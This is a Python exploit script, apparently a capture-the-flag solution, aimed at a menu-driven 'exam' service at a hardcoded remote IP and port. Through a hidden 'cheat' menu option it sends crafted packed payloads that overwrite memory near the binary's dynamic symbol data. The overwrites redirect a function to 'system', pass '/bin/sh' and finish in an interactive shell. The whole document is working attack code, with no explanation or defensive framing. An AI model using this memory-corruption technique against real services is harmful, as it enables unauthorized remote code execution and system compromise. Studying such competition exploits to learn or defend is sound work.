#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re
import time

#host = "10.211.55.16"
#port = 8888
host = "128.199.232.78"
port = 5432

sock = make_conn(host,port)


def register(sock):
    recvuntil(sock,"exit")
    sendline(sock,"1")
    recvuntil(sock,"chars")
    sendline(sock,"aa")
    recvuntil(sock,"self")
    sendline(sock,"bb")

def exam(sock,types,content):
    recvuntil(sock,"exit")
    sendline(sock,"2")
    recvuntil(sock,"dota")
    sendline(sock,str(types))
    recvuntil(sock,"essay?")
    sendline(sock,str(len(content)))
    time.sleep(0.2)
    recvuntil(sock,"OK")
    sendline(sock,content)

def cheat(sock,types,content):
    recvuntil(sock,"exit")
    sendline(sock,"1024")
    recvuntil(sock,":)")
    sendline(sock,str(types))
    time.sleep(0.2)
    sendline(sock,content)

def resit(sock,types):
    recvuntil(sock,"exit")
    sendline(sock,"5")
    recvuntil(sock,"dota")
    sendline(sock,str(types))

register(sock)
exam(sock,2,"a"*104)
resit(sock,2)
exam(sock,1,"b"*104)

syrtabatdyn = 0x6021b0

payload = ""
payload += pack(2)
payload += pack(0x68)
payload += pack(0x602600) 
payload += pack(0x004009b0) #put

cheat(sock,2,payload)
cheat(sock,1,"system")

payload2 = ""
payload2 += pack(2)
payload2 += pack(0x68)
payload2 += pack(0x6021b0) 
payload2 += pack(0x004009b0) #put

cheat(sock,2,payload2)
cheat(sock,1,pack(0x602559))

payload3 = ""
payload3 += pack(2)
payload3 += pack(0x68)
payload3 += pack(0x602318) 
payload3 += pack(0x004009b0) #put

cheat(sock,2,payload3)
cheat(sock,1,pack(0x00400946))
cheat(sock,2,"/bin/sh")
resit(sock,2)

inter(sock)
